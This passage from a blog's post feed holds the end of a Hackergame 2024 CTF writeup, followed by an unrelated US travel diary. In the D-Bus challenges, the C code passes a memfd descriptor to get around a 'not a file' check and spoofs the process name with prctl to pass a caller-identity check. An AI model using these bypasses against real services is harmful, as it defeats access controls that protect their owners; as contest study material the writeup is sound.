error-\u0026gt;message); g_error_free(error); return EXIT_FAILURE; } // Call the D-Bus method with the required string result = g_dbus_connection_call_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method g_variant_new(\u0026#34;(s)\u0026#34;, \u0026#34;Please give me flag1\u0026#34;), // parameters G_VARIANT_TYPE(\u0026#34;(s)\u0026#34;), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) NULL, \u0026amp;error ); if (result) { const gchar *response; g_variant_get(result, \u0026#34;(\u0026amp;s)\u0026#34;, \u0026amp;response); g_print(\u0026#34;%s\\n\u0026#34;, response); g_variant_unref(result); } else { g_printerr(\u0026#34;Error calling D-Bus method: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); } g_object_unref(connection); return EXIT_SUCCESS; } 使用方法：\n首先将这个程序编译: gcc getflag1.c `pkg-config --cflags --libs gio-2.0` -o getflag1 然后将编译好的程序转换成base64: base64 getflag1 --wrap=0 将base64编码后的内容提交给服务器 这个程序会：\n连接到DBus系统总线 调用FlagService的GetFlag1方法 传入指定的字符串\u0026quot;Please give me flag1\u0026quot; 打印返回的flag内容 程序模仿了getflag3.c的结构，但做了必要的修改以适应GetFlag1方法的要求。主要的区别是：\n添加了正确的参数 \u0026quot;Please give me flag1\u0026quot; 指定了正确的返回类型 G_VARIANT_TYPE(\u0026quot;(s)\u0026quot;) 正确处理并打印返回的字符串 这应该能成功获取到第一个flag。需要注意的是，题目使用了Docker环境，所以我们需要按照指定的方式提交程序。\n要继续获取flag2和flag3吗？\nflag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_c7afe80dbf} If I Could Be A File Descriptor 好的，让我们来分析获取flag2的方法。\n从flagserver.c的代码中可以看到，GetFlag2方法需要：\n一个文件描述符(fd)作为参数 从这个fd读取的内容必须严格等于\u0026quot;Please give me flag2\\n\u0026quot; 这个fd不能指向文件系统上的文件（通过检查/proc/self/fd/{fd}的符号链接实现） 由于不能使用普通文件，我们可以使用pipe或memfd来实现。我选择使用memfd，因为它更现代且更适合这种场景。\n#define _GNU_SOURCE #include \u0026lt;gio/gio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #define DEST \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; #define OBJECT_PATH \u0026#34;/cn/edu/ustc/lug/hack/FlagService\u0026#34; #define METHOD \u0026#34;GetFlag2\u0026#34; #define INTERFACE \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; int main() { GError *error = NULL; GDBusConnection *connection; GVariant *result; // Create memfd int memfd = memfd_create(\u0026#34;flag2_request\u0026#34;, 0); if (memfd == -1) { perror(\u0026#34;memfd_create failed\u0026#34;); return EXIT_FAILURE; } // Write the required message const char *msg = \u0026#34;Please give me flag2\\n\u0026#34;; if (write(memfd, msg, strlen(msg)) != strlen(msg)) { perror(\u0026#34;write failed\u0026#34;); close(memfd); return EXIT_FAILURE; } // Reset file position to beginning if (lseek(memfd, 0, SEEK_SET) == -1) { perror(\u0026#34;lseek failed\u0026#34;); close(memfd); return EXIT_FAILURE; } // Connect to the system bus connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026amp;error); if (!connection) { g_printerr(\u0026#34;Failed to connect to the system bus: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); close(memfd); return EXIT_FAILURE; } // Create GUnixFDList and add our fd GUnixFDList *fd_list = g_unix_fd_list_new(); gint fd_index = g_unix_fd_list_append(fd_list, memfd, \u0026amp;error); if (fd_index == -1) { g_printerr(\u0026#34;Failed to append fd: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); g_object_unref(connection); close(memfd); return EXIT_FAILURE; } // Call the D-Bus method result = g_dbus_connection_call_with_unix_fd_list_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method g_variant_new(\u0026#34;(h)\u0026#34;, fd_index), // parameters G_VARIANT_TYPE(\u0026#34;(s)\u0026#34;), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) fd_list, // fd_list NULL, // out_fd_list NULL, \u0026amp;error ); if (result) { const gchar *response; g_variant_get(result, \u0026#34;(\u0026amp;s)\u0026#34;, \u0026amp;response); g_print(\u0026#34;%s\\n\u0026#34;, response); g_variant_unref(result); } else { g_printerr(\u0026#34;Error calling D-Bus method: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); } g_object_unref(fd_list); g_object_unref(connection); close(memfd); return EXIT_SUCCESS; } 使用方法：\n编译程序: gcc getflag2.c `pkg-config --cflags --libs gio-2.0` -o getflag2 将编译好的程序转换成base64: base64 getflag2 --wrap=0 将base64编码后的内容提交给服务器 这个程序的关键点是：\n使用memfd_create创建一个内存文件描述符，这样创建的fd不会指向文件系统上的任何文件 向memfd写入指定的字符串\u0026quot;Please give me flag2\\n\u0026quot; 将文件指针重置到开始位置，这样服务器读取时能读到完整内容 使用g_unix_fd_list_new和g_unix_fd_list_append来创建和添加文件描述符 使用g_dbus_connection_call_with_unix_fd_list_sync而不是普通的call_sync，因为我们需要传递文件描述符 这个方案很巧妙地绕过了服务器的文件系统检查，因为memfd创建的是内存中的文件描述符，不存在于实际的文件系统中，同时又满足了服务器要求读取特定内容的条件。\n需要获取flag3吗？\nflag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_36a581e78b} Comm Say Maybe 让我分析一下获取flag3的要求。\n从flagserver.c的代码中，我们可以看到GetFlag3方法有一个特殊的要求：调用程序的进程名（在/proc/{pid}/comm中）必须严格等于\u0026quot;getflag3\\n\u0026quot;。\n实际上，题目已经提供了getflag3.c，并且在Makefile中会编译并安装到/usr/bin/getflag3。这看起来是正确的实现，但是从题目server.py中可以看到：\n程序会以nobody用户身份运行 程序会被放在/dev/shm/executable路径下 程序的名称会变成\u0026quot;executable\u0026quot;而不是\u0026quot;getflag3\u0026quot; 因此，我们需要修改程序来确保进程名是\u0026quot;getflag3\u0026quot;。我们可以使用prctl系统调用来修改进程名：\n#define _GNU_SOURCE #include \u0026lt;gio/gio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define DEST \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; #define OBJECT_PATH \u0026#34;/cn/edu/ustc/lug/hack/FlagService\u0026#34; #define METHOD \u0026#34;GetFlag3\u0026#34; #define INTERFACE \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; int main() { // Set the process name to \u0026#34;getflag3\u0026#34; if (prctl(PR_SET_NAME, \u0026#34;getflag3\u0026#34;, 0, 0, 0) != 0) { perror(\u0026#34;prctl failed\u0026#34;); return EXIT_FAILURE; } GError *error = NULL; GDBusConnection *connection; GVariant *result; connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026amp;error); if (!connection) { g_printerr(\u0026#34;Failed to connect to the system bus: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); return EXIT_FAILURE; } result = g_dbus_connection_call_sync( connection, DEST, // destination OBJECT_PATH, // object path INTERFACE, // interface name METHOD, // method NULL, // parameters G_VARIANT_TYPE(\u0026#34;(s)\u0026#34;), // expected return type G_DBUS_CALL_FLAGS_NONE, -1, // timeout (use default) NULL, \u0026amp;error ); if (result) { const gchar *response; g_variant_get(result, \u0026#34;(\u0026amp;s)\u0026#34;, \u0026amp;response); g_print(\u0026#34;%s\\n\u0026#34;, response); g_variant_unref(result); } else { g_printerr(\u0026#34;Error calling D-Bus method: %s\\n\u0026#34;, error-\u0026gt;message); g_error_free(error); } g_object_unref(connection); return EXIT_SUCCESS; } 使用方法：\n编译程序: gcc getflag3-modified.c `pkg-config --cflags --libs gio-2.0` -o getflag3-modified 将编译好的程序转换成base64: base64 getflag3-modified --wrap=0 将base64编码后的内容提交给服务器 主要的改动是：\n添加了prctl系统调用来设置进程名为\u0026quot;getflag3\u0026quot; 修改了返回类型为G_VARIANT_TYPE(\u0026quot;(s\u0026quot;)以正确处理返回值 添加了返回值的打印 这个程序应该能成功获取flag3，因为：\n使用prctl设置的进程名会反映在/proc/{pid}/comm中 即使程序文件名是executable，通过prctl设置的进程名依然会生效 程序在nobody用户下运行也不会影响prctl的功能 所有的flags现在都应该拿到了！这个题目很好地展示了DBus服务的安全检查机制，包括：\nflag1: 简单的字符串匹配 flag2: 文件描述符和内容检查 flag3: 进程名验证 flag{prprprprprCTL_15your_FRiEND_9f3f4bbbc3} 关灯 这道题主要是把灯的字符串转换成矩阵，然后用高斯消元法解方程组。最后一问没有想到可以提前保存PLU分解的结果，因此自认为耗时太长就放弃了。\n将3D问题转换为线性方程组 使用GF(2)上的高斯消元法求解（因为开关状态是0/1的异或运算） 将解转换回开关序列 import numpy as np from typing import List, Tuple def create_coefficient_matrix(n: int) -\u0026gt; np.ndarray: \u0026#34;\u0026#34;\u0026#34;Create the coefficient matrix for the linear system.\u0026#34;\u0026#34;\u0026#34; size = n * n * n matrix = np.zeros((size, size), dtype=np.uint8) for i in range(n): for j in range(n): for k in range(n): idx = i * n * n + j * n + k # The switch affects itself matrix[idx][idx] = 1 # Affect adjacent positions if i \u0026gt; 0: # up matrix[idx - n*n][idx] = 1 if i \u0026lt; n-1: # down matrix[idx + n*n][idx] = 1 if j \u0026gt; 0: # left matrix[idx - n][idx] = 1 if j \u0026lt; n-1: # right matrix[idx + n][idx] = 1 if k \u0026gt; 0: # front matrix[idx - 1][idx] = 1 if k \u0026lt; n-1: # back matrix[idx + 1][idx] = 1 return matrix def gauss_elimination_gf2(matrix: np.ndarray, vector: np.ndarray) -\u0026gt; np.ndarray: \u0026#34;\u0026#34;\u0026#34;Perform Gaussian elimination in GF(2).\u0026#34;\u0026#34;\u0026#34; n = len(vector) augmented = np.column_stack((matrix, vector)) # Forward elimination for i in range(n): # Find pivot pivot_row = i while pivot_row \u0026lt; n and augmented[pivot_row, i] == 0: pivot_row += 1 if pivot_row == n: continue # Swap rows if necessary if pivot_row != i: augmented[i], augmented[pivot_row] = augmented[pivot_row].copy(), augmented[i].copy() # Eliminate below for j in range(i + 1, n): if augmented[j, i] == 1: augmented[j] = (augmented[j] + augmented[i]) % 2 # Back substitution solution = np.zeros(n, dtype=np.uint8) for i in range(n-1, -1, -1): if augmented[i, i] == 0: if augmented[i, -1] == 1: raise ValueError(\u0026#34;No solution exists\u0026#34;) continue solution[i] = augmented[i, -1] for j in range(i+1, n): solution[i] = (solution[i] + augmented[i, j] * solution[j]) % 2 return solution def solve_lights_out_3d(lights_string: str, n: int) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Solve the 3D Lights Out puzzle.\u0026#34;\u0026#34;\u0026#34; # Convert lights string to array lights = np.array([int(x) for x in lights_string], dtype=np.uint8) # Create coefficient matrix coef_matrix = create_coefficient_matrix(n) # Solve using Gaussian elimination try: solution = gauss_elimination_gf2(coef_matrix, lights) return \u0026#39;\u0026#39;.join(map(str, solution)) except ValueError: return \u0026#34;No solution exists\u0026#34; # Example usage function def solve_puzzle(lights_string: str, n: int) -\u0026gt; str: result = solve_lights_out_3d(lights_string, n) if result == \u0026#34;No solution exists\u0026#34;: print(\u0026#34;No solution exists for this puzzle\u0026#34;) return \u0026#34;\u0026#34; return result flag：\nflag{bru7e_f0rce_1s_a1l_y0u_n3ed_1f50afa982} flag{prun1ng_1s_u5eful_690eea3cbb} flag{lin3ar_alg3bra_1s_p0werful_27dafeebb2} 零知识数独 数独高手 直接做数独就可以得到flag\nZK高手 在做这道题之前，我对零知识证明完全不了解，因此先问了AI这道题是什么意思：\n这是一个零知识数独证明系统，其中: 数独谜题(unsolved_grid)是公开的 解答(solved_grid)是私密的 需要生成一个证明来证明我们知道正确的解答 为了解题，我们需要: 找到一个有效的数独谜题及其解答 使用circom电路生成证明 确保证明可以通过verification_key.json的验证 verification_key.json显示这是使用Groth16协议，需要81个公开输入(就是9x9的数独谜题)。 因此，我们需要做的是：\n构造一个有效的数独题目和解答 使用setup.sh生成所需的证明系统组件 生成并验证proof.json 先写一个数独解码的脚本：\nimport json def print_grid(grid): \u0026#34;\u0026#34;\u0026#34;Pretty print the sudoku grid\u0026#34;\u0026#34;\u0026#34; for i in range(9): if i % 3 == 0 and i != 0: print(\u0026#34;- - - - - - - - - - - -\u0026#34;) for j in range(9): if j % 3 == 0 and j != 0: print(\u0026#34;|\u0026#34;, end=\u0026#34; \u0026#34;) if j == 8: print(grid[i][j]) else: print(str(grid[i][j]) + \u0026#34; \u0026#34;, end=\u0026#34;\u0026#34;) def convert_1d_to_2d(puzzle): \u0026#34;\u0026#34;\u0026#34;Convert 1D array to 2D grid\u0026#34;\u0026#34;\u0026#34; return [puzzle[i:i + 9] for i in range(0, 81, 9)] def is_safe(grid, row, col, num): \u0026#34;\u0026#34;\u0026#34;Check if it\u0026#39;s safe to place number\u0026#34;\u0026#34;\u0026#34; # Check row for x in range(9): if grid[row][x] == num: return False # Check column for x in range(9): if grid[x][col] == num: return False # Check 3x3 box start_row, start_col = 3 * (row // 3), 3 * (col // 3) for i in range(3): for j in range(3): if grid[i + start_row][j + start_col] == num: return False return True def solve_sudoku(grid): \u0026#34;\u0026#34;\u0026#34;Solve sudoku using backtracking\u0026#34;\u0026#34;\u0026#34; empty = find_empty(grid) if not empty: return True row, col = empty for num in range(1, 10): if is_safe(grid, row, col, num): grid[row][col] = num if solve_sudoku(grid): return True grid[row][col] = 0 return False def find_empty(grid): \u0026#34;\u0026#34;\u0026#34;Find empty cell in grid\u0026#34;\u0026#34;\u0026#34; for i in range(9): for j in range(9): if grid[i][j] == 0: return (i, j) return None def create_input_files(puzzle_json, output_input=\u0026#34;input.json\u0026#34;, output_public=\u0026#34;public.json\u0026#34;): \u0026#34;\u0026#34;\u0026#34;Create input.json and public.json from puzzle JSON\u0026#34;\u0026#34;\u0026#34; # Load puzzle if isinstance(puzzle_json, str): with open(puzzle_json) as f: data = json.load(f) puzzle = data[\u0026#39;puzzle\u0026#39;] else: puzzle = puzzle_json[\u0026#39;puzzle\u0026#39;] # Convert to 2D and solve grid = convert_1d_to_2d(puzzle) solution = [row[:] for row in grid] # Create a copy print(\u0026#34;Original puzzle:\u0026#34;) print_grid(grid) if solve_sudoku(solution): print(\u0026#34;\\nSolution found:\u0026#34;) print_grid(solution) # Create input.json input_data = { \u0026#34;unsolved_grid\u0026#34;: grid, \u0026#34;solved_grid\u0026#34;: solution } with open(output_input, \u0026#39;w\u0026#39;) as f: json.dump(input_data, f) # Create public.json public_data = { \u0026#34;public\u0026#34;: [str(x) for x in puzzle] } with open(output_public, \u0026#39;w\u0026#39;) as f: json.dump(public_data, f) print(\u0026#34;\\nCreated input.json and public.json successfully!\u0026#34;) else: print(\u0026#34;No solution exists!\u0026#34;) # Example usage: puzzle = { \u0026#34;puzzle\u0026#34;: [ 9,0,0,0,0,0,1,0,0, 8,0,0,0,0,0,2,0,0, 7,0,0,0,0,0,3,0,0, 0,0,1,0,0,0,0,0,6, 0,2,0,0,0,0,0,7,0, 0,0,3,0,0,0,0,0,0, 0,1,0,0,0,0,0,6,0, 0,0,2,0,0,0,0,0,7, 0,3,0,0,0,0,0,0,0, ], \u0026#34;difficulty\u0026#34;: \u0026#34;expert\u0026#34; } create_input_files(puzzle) 然后用解码好的数独答案生成证明即可：\n./circom-macos-amd64 sudoku.circom --r1cs --wasm --sym node sudoku_js/generate_witness.js sudoku.wasm input.json witness.wtns snarkjs groth16 prove sudoku.zkey witness.wtns proof.json public.json snarkjs groth16 verify verification_key.json public.json proof.json 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」 「行吧就算标题可以很长但是 flag 一定要短点」 很搞笑的是，这道题可以拿屏蔽后的字符问LLM，LLM竟然一次给出了正确的答案：\nIn the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun. P.S (尝试用LLM Zero-shot完成hackergame) LLM的性能在这一年有了很大的进步。经过测试，在不反复询问LLM，让他修改回答的情况下，LLM至少可以一次做出Node.js is Web Scale, PaoluGPT, 惜字如金 3.0(1), 不太分布式的软总线(1,2,3), 零知识数独(1,2)，加起来已经有1600分了。\n","permalink":"https://blog.sparktour.me/posts/2024/11/14/ustc-hackergame-2024-writeup/","summary":"\u003cp\u003e这是本人第五次参加USTC的hackergame了，本次的排名相比上次略有进步，进到了50名内。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"paolugpt\"\u003ePaoluGPT\u003c/h2\u003e\n\u003cp\u003e观察代码注意到了可能可以进行SQL注入：\u003c/p\u003e","title":"USTC Hackergame 2024 Writeup"},{"content":"这篇博客分享笔者于2024年暑假的美国旅行，笔者在本次时长两周的旅行中去到了西海岸的旧金山，洛杉矶和东海岸的纽约，华盛顿在内的美国城市。\n路线与景点图 笔者大致的行程是从旧金山开车到洛杉矶，随后乘飞机前往纽约，乘火车前往华盛顿，最后乘飞机返回旧金山。\n行前准备 签证 填DS160，预约slot之后去领馆面谈即可。南方使馆的slot比较紧张，因此请尽量在计划旅行前一年左右预约。根据笔者身边的DP，在读研究生申请签证时officer可能会索要成绩单（transcript）和CV（就算目的是旅游也会），所以建议提前准备。如果没带可能会被check，需要发自己的成绩单，CV和旅行计划到领馆的邮箱，大概处理需时一个月左右，最后会批下来一张有效期一年，带CLEARANCE RECEIVED 202X-XX-XX的签证。据说这个Clearance 48个月有效，但笔者也没试过再办一次签证。一年签证相比十年签证的唯一好处是不需要再填写EVUS了。\n机票 建议多刷刷Google Flight和携程等平台，一般建议在旅行前6个月左右开始关注并购买跨洋段的机票，因为这时候价格相对较低。但由于笔者选择了8月出行，可能和许多留学生返校的时间接近，因此直飞和比较顺路的转机（经日本，韩国）的机票价格都超过了1万元。综合了机票价格和乘坐体验等因素后，选择了MFM-SIN—SFO，SFO-SIN-HKG这条新加坡航空承运的路线，打完学生折扣机票大约7500一个人。但不得不说这个飞法比直飞远了太多，MFM-SIN—SFO单程的大圆航线距离高达16,117km，这个距离已经可以飞到南美了，而HKG-SFO的直飞只需要11,147km，距离相差了1/3。\n美国境内的机票建议在起飞前2个月左右购买。不过考虑美国三大航空公司（UA，DL，AA）的美国国内航班都允许任意改签和退差价（到代金券），就算买贵了也可以通过退代金券的方式改成更便宜的票。\n租车 考虑到这是笔者第一次在境外开车，我们在租租车上定了旧金山到洛杉矶的自驾车辆（理论上租租车，携程这样的大型OTA应该都可以，他们租车可以拿到旅行社的协议价，唯一的限制是租车人需要出示中国大陆的驾照），最后分配到的租车商是Avis。租7天的Compact类型的车大约花费了495USD。实际拿到的车是2020 Hyundai Elantra Limited，这辆车带ACC，车道保持和Carplay等功能，除了噪音控制一般之外笔者还是比较满意的。\n2020 Hyundai Elantra Limited 内地和北美都为左舵右驾，明显的区别就是北美看到STOP标需要完全停止等3秒左右才能通行，以及红灯右转时也需要完全停下后才能右转。另外笔者注意到的一个细节时在北美的路口等红灯时，跟别的车不要太近。按照内地的习惯跟车的话美国人可能以为你要追尾了，遇到你跟的太近还会主动向前开一些。 景点/体验门票预订 美国的博物馆不如欧洲等地的紧俏，基本上提前两三天预订甚至现场购买都可以。我们唯一遇到现场卖票卖完了的门票是旧金山恶魔岛的轮渡。\n个人在此推荐用「美旅通」这个网站做计划，尤其是指定参观主要景点的行程时，个人觉得效果很不错。相比小红书，某些“旅行博客”，它的信息密度很高，且基本没有广告（感觉主要的盈利手段在于住宿的aff）。 支付方式/小费 如果选餐厅时不想依赖小红书等社交媒体平台，可以考虑直接筛选Google Maps上评分高于4.3的餐厅，基本上过了这个线的餐厅都有一定的特色，不太会难吃。当然如果还是懒得选，可以考虑吃常见的连锁快餐店如麦当劳，Wendy\u0026rsquo;s，Taco Bell等。 绝大部分地方都支持用信用卡消费，我们全程只遇到了一个1.5USD Pizza这种小店不收信用卡。考虑到北美的小费文化（尽管笔者并不喜欢），建议留下几十张的1USD钞票方便在酒店接驳车，酒店housekeeping的时候给小费（真没有的话不给也可以，笔者也是在第一天的酒店前台换的）。\n场景 建议给小费吗 该给多少 如何给 搬行李，代客泊车 如果没有标价建议给 搬行李1USD一个箱子，泊车看情况 现金 housekeeping 如果住超过1晚可以给 2-5USD/晚 现金，放在枕头下 餐厅（需要服务员点餐和上菜的） 一般要给 如果是自己写小费金额，笔者一般给税前金额的10-15%并且取整 刷卡时计算 餐厅（前台点餐和付款的） 可选 如果服务员不上菜，而是需要我自己去pickup，笔者一般不给。如果服务员上菜就给10% 刷卡时计算，有的POS机默认选项就是15%，18%，20%之类的，可以无视并且点custom输入想给的数值 电话/流量卡 如果有支持eSIM的手机，可以尝试用Visible，Verizon的15天试用。或者可以去飞猪购买手机卡，15天有效的卡大概120-150CNY左右。需要注意的是，如果需要自驾一些比较偏僻的地方，不管是哪家运营商大概都是没有信号的（比如一号公路中段），如有必要可以提前下载离线地图。另外，美国的手机卡开热点会限速（大概5Mbps），如果对网速有要求，最好还是一人一张卡比较方便。\n气候 8月份的东西海岸都不会太冷，气温大致介于15-30度间，最冷的时候（旧金山清晨，纽约）穿一件毛衣+一件外套足够，最热的时候（洛杉矶）可以短袖短裤。\nDay 0 到达旧金山 澳门-新加坡段看到的晚霞，非常鲜艳 飞机上的日出，这个时候应该在阿拉斯加附近 考虑到我们第三天需要去机场租车和市区住宿的价格，我们选择在机场附近Millbrae地区的Aloft SFO酒店住宿。酒店有免费的接驳车往返机场，大概半小时一班，接驳车上坐10分钟就到。酒店里Caltrain和BART的Millbrae车站也很近，走路10分钟能到。\n旧金山机场国际航站楼，可以在这里等免费接驳车去酒店 存下行李后当地一位朋友带笔者去市区转了一圈，简单逛了一下Union Square和唐人街附近的街区。\nI80进城方向和旧金山的部分天际线 唐人街附近的街道一景 “空心化”的市区，许多商铺空置并挂出了招租的告示 Union Square附近的街区，Waymo RoboTaxi和远处的Apple Store Millbrae附近的道路，看起来很新，应该是最近修的 Day 1 旧金山市区 「美旅通」上的地图 考虑到旧金山的治安（特别是砸车问题），我们没有尝试在市区自驾，主要依靠的是公共交通，比如BART，有轨电车和公交车。\n早上笔者乘坐BART进城，BART可以用clipper搭乘，在iPhone上开卡即可（无开卡费）。不得不说BART的逃票问题确实严重，进闸和出闸的时候笔者都看到了不止一人跳闸机进出检票口，职员似乎也不太在意。\nBART车内环境，特别的一点是BART是宽轨列车，因此车内看起来会比一般的地铁宽一些 坐到Union Square之后我们步行去往了Painted Ladies，随后步行到了日本城，在那里吃了午饭。\nPainted Ladies和城市天际线 日本城的和平塔（Peace Pagoda） 日本城里的拉面（HINODEYA Ramen Japantown） 饭后我们体验了一下Waymo的自动驾驶汽车。和之前在广州体验的小马智行类似，Waymo也是通过App选定起点和终点，然后到指定地点候车即可。相比小马智行，Waymo的车开的似乎更激进一些（可能也跟Waymo用的是电车有关），甚至会尝试加塞右转弯的车流。我们一共打了2.4mile（4km），车费为24USD，跟Uber比还是挺贵的（大概是Uber标准车的两倍左右）。\nWaymo 打车到海边后笔者体验了一下铛铛车（又名Cable Cars或者电车），体验和香港的电车类似，可惜人比较多，没能体验站在车两侧的感觉。\n电车（铛铛车）换向 之后我们步行到了渔人码头，本身是想坐轮渡去恶魔岛逛一下的，但因此恶魔岛的轮渡在我们提前三天买票的时候卖完了，就退而求其次选择了去看金门大桥的观光船（观光船的位置很充足，可以随时在售票厅买）。\n观光船 船上看到的金门大桥一侧桥墩 金门大桥全景 恶魔岛和旧金山市区 傍晚秉持着把旧金山的公共交通都尝试一遍的思路，我们坐公交到了CalTrain的旧金山站乘火车回Millbrae。相比BART，Caltrain就属于更正经的通勤铁路了（但可以用clipper搭乘），甚至检票的职员在开车前10分钟才会放人去站台上，和CR有得一拼了。我们坐到的CalTrain还是电气化之前的Gallery Car（下图右侧），似乎已经有至少40年历史了。车厢的结构很独特，二层中间是中空的，和一层是通的。\n新旧Caltrain，旧的CalTrain将在2024年全部退役 从Millbrae站回酒店，需要经过US101的入口匝道 Day 2 圣何塞 AirTrain和BART的高架桥 本日早上笔者再次坐酒店的接驳车返回了机场，并乘坐机场AirTrain前往租车的停车场租车。从旧金山到洛杉矶的自驾从这天正式开始。根据车辆的里程表，我们在六天半的时间里一共开了745mi（1198km）。\n由于我们已经在网上预付了租车的钱，因此只要给柜台验证一下驾照和签合同就行，柜台冻结卡内250USD的押金之后告诉我们车在停车场的位置后，直接上楼取车即可。唯一要注意的是柜台的员工可能会问你要不要加一些保险，加油服务和ETC之类的，如果没有需求的话需要明确跟他们拒绝。笔者租车时选的是Compact（卡罗拉或同等类型），拿到的车是2020 Hyundai Elantra Limited，这辆车带液晶仪表，ACC，车道保持和Carplay等功能。\n斯坦福大学 从机场开出后，我们先前往了斯坦福大学，如果需要停车的话可以考虑停在Stanford Oval周围的停车位，如果想顺便在附近吃饭的话，也可以把车停在Stanford Shopping Center旁边的停车场里，然后走路或者坐大学的穿梭巴士前往学校。\n带有毕业年份印记的地砖 Hoover Tower 有意思的是斯坦福的校园是我们整段路程上华人游客最多的一处「景点」，可能这就是东亚人的名校情结吧。\nStanford Oval （和旁边的停车位） GooglePlex GooglePlex有一个单独的访客中心，里面有一个卖Pixel，Google Cast等google自有品牌的商店和一个咖啡馆。游客停车可以停到Shoreline Amphitheatre Parking Lot C。过个马路就到GooglePlex的新主楼了。Google园区里有许多单车，似乎是可以随意骑。我们周末的时候去工区时看起来内部没有任何人在加班，灯也是关着的，不知道是不是总部需要给五天工作制做个表率。\nGooglePlex访客中心外面的单车 Google工区内一景 Google的老办公楼( 1900 Charleston Road) Apple Park Visitor Center Apple的访客中心在Apple Park的外侧，游客并不能进到Apple Park内部参观。不过Apple Park有一个AR模型，游客可以拿iPad看整个Apple Park的模型（可能是为了展示ARKit吧）。Apple Park访客中心同时也是一个Apple Store，相比一般的Apple Store会卖衬衫，杯子等小纪念品。\n基于AR Kit的Apple Park模型 Visitor Center的路牌 逛完Apple Park之后，我们就驱车去了酒店，有意思的是酒店在Cisco和Cadence的总部旁边，似乎是这两家公司的接待酒店，因此酒店里还能看到名叫Cadence的Wi-Fi。酒店旁边有一个购物广场（北美的购物广场是字面意思上的广场，即中间一大片停车场，四周围绕着一些店铺），里面有沃尔玛和麦当劳，我们的晚餐也就在那里解决了，顺便买了一些水放车上。\nUS101南行段，San Jose段 路过Cisco总部 麦当劳 沃尔玛门口和远处的Sierra Vista Day 3 Montery, CA-1, Seaside CA-1 （一号公路）在夏天的时候经常会塌方，笔者旅行时只有南往北方向是通的，北往南不通。因此笔者开到了Great Sur Vista Point就原路返回了。如果需要查阅CA-1的状态，可以在CA DOT的网站或者这个链接查阅。 一早在麦当劳吃完早饭后，先沿CA-85往西南方向行进，经过一段山路之后即可到达CA-1。如果是去的太早的话，有可能路边的雾还没有完全散开，路上的能见度可能会比较低，驾车时要小心。\n山路上的货车 葡萄酒庄 平流雾还没散 雾气散去之后 由于道路中断，笔者只开到了Great Sur Vista Point附近。路边的风景还是很不错的，尤其是海非常蓝。\nBixby Bridge 远看Bixby Bridge Garr Apata State Park 沿着海边的公路 停在路边的车辆（最右边是我们租的伊兰特） 从CA-1开回来之后，我们又去17 mile drive （一条沿海的收费浏览公路）转了一圈。建议游览时从Pacific Grove Gate进，这样靠右游览时可以一直沿着海边开。\n入口 海边的落日 海边的古树 石滩 傍晚的CA-1 Day 4 US-101, King City, Morro Bay 由于CA-1因滑坡未能全线通车，我们只能绕回了US-101，并继续往南前行至Morro Bay。这一天主要都在开车，中途在King City休息了一会。\n离开了CA-1之后，周围的景色又变成了荒漠风格，有点类似河西走廊的高速 King City的一个休息区，有加油站，肯德基，麦当劳，星巴克等 继续在US-101上前行 再次回到CA-1 傍晚我们开到了当天的住宿地点Morro Bay。Morro Bay也是《赛博朋克2077》中夜之城的原型，在设定里，Morro Bay被称为“明日湾”（Tomorrow Bay）。\nMorro Rock Morro Bay码头 Morro Bay码头 我们的晚饭在Morro Bay码头边找了一家西餐厅Tognazzini\u0026rsquo;s Dockside Restaurant，点了他们的烤海鲜拼盘，份量挺大 Morro Bay发电厂的烟囱，但现在已经停用 落日，拍照的位置大概在Morro Bay Water Access 汽车旅馆前的晚霞 Day 5 CA-1, Santa Barbara, Los Angles 本日依然是继续向南自驾，中间在Solvang镇停了一会，这个镇大概是一个丹麦风情的小镇（有点类似在内地建XX古城的感觉）。\nSolvang小镇一景 Solvang小镇的道路 公路上的云层 开进去之后就和雾天一样了 加油站，北美的加油站需要自助加油，插信用卡提枪就行。现在大部分的加油站都支持外国信用卡输PIN加油了 南加州的丘陵 Santa Barbara的海边 Santa Barbara教堂 下山回到CA-1的路上 回到了CA-1，因为修路有些堵车 典型的南加州绿化，路边的棕榈树（和典型的加州油价） 变回两车道 郊区快速路 Pacific Palisades地区，已经到了洛杉矶的郊外了 Pacific Palisades 到达Santa Monica附近 走I-10高速进城 Day 6 洛杉矶市区 美旅通的导览图，可以参考此图安排行程 K-Town 